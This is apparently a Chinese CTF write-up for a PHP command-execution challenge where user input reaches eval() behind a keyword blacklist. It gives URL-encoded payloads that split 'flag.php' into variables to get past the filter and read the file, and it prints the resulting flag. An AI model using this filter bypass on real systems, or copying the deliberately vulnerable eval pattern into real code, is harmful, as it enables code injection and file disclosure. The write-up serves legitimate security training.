题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：

```php
$a='fla'; $b='g.php'; highlight_file($a.$b);
```
改造一下加上第三个变量：
```php
$a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
```

浏览器自动 URL 编码后的 Payload：
```
/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
```
或者我们可以把空格去掉：
```php
$a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
```
浏览器自动 URL 编码后的 Payload 会更简单明了一点：
```
/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
```
获得的 flag：
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
```